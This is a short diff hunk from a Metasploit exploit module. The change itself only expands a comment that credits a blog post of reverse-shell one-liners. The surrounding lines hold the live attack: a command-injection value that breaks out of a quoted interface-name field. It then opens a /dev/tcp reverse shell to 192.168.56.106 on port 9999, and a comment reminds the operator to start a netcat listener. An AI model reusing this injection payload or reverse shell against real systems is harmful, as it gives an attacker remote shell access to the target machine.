@@ -117,7 +117,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     print_status("Delivering payload...")
 
-    # payload ; thanks goes to: ber...<link>
+    # payload ; thanks goes to: bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
     # remember to set your listening nc in 2nd window
     cmd = "eth0'; 0<&196;exec 196<>/dev/tcp/192.168.56.106/9999;sh <&196 >&196 2>&196 ;#"
 
